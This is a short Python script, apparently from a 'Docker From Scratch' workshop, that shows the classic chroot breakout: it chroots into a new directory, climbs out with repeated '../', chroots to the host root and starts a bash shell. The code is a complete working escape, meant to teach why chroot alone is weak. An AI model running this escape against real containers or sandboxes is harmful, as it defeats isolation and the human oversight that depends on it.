#!/usr/bin/env python
"""Docker From Scratch Workshop - Breakout script.
"""

import os

# Create a directory and chroot to it but we don't want to chdir to it
os.makedirs('.foo')
os.chroot('.foo')

# pwd still has a reference to a directory outside the (new) chroot, so chdir
# to a directory above pwd.
# The kernel will automatically convert extra ../ to /
os.chdir('../../../../../../../../')

# finally chroot to the old (topmost) root
os.chroot('.')

# now we can exec a shell in the host
os.execv('/bin/bash', ['/bin/bash'])
